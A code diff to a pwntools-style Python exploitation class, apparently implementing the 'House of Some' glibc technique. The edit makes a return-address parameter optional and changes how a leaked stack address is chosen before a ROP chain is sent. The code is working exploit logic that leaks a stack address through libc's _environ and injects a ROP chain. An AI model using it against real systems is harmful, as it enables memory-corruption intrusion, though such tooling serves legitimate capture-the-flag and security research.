@@ -125,7 +125,7 @@ class HouseOfSome:
         assert b"\n" not in payload, "\\n in payload."
         return payload
     
-    def bomb(self, io: tube, retn_addr):
+    def bomb(self, io: tube, retn_addr=0):
 
         stack = self.bomb_raw(io, retn_addr)
 
@@ -137,7 +137,7 @@ class HouseOfSome:
         assert b"\n" not in rop_chain, "\\n in rop_chain"
         io.sendline(rop_chain)
 
-    def bomb_raw(self, io: tube, retn_addr):
+    def bomb_raw(self, io: tube, retn_addr=0):
         payload = self.write(1, self.libc.symbols['_environ'], 0x8)
         io.sendline(payload)
         stack_leak = u64(io.recv(8).ljust(8, b"\x00"))
@@ -146,13 +146,13 @@ class HouseOfSome:
         payload = self.write(1, stack_leak - self.LEAK_LENGTH, self.LEAK_LENGTH)
         io.sendline(payload)
         # retn_addr = self.libc.symbols['_IO_file_underflow'] + 390
-        log.success(f"retn_addr : {retn_addr:#x}")
         buf = io.recv(self.LEAK_LENGTH)
         flush_retn_addr = self.stack_view(buf)
-        if flush_retn_addr != retn_addr and flush_retn_addr != 0:
+        if retn_addr == 0 and flush_retn_addr != 0:
             retn_addr = flush_retn_addr
             success("retn_addr(_IO_flush_all) find")
             success(f"fix retn_addr to {flush_retn_addr:#x}")
+        log.success(f"retn_addr : {retn_addr:#x}")
         offset = buf.find(p64(retn_addr))
         log.success(f"offset : {offset:#x}")
 
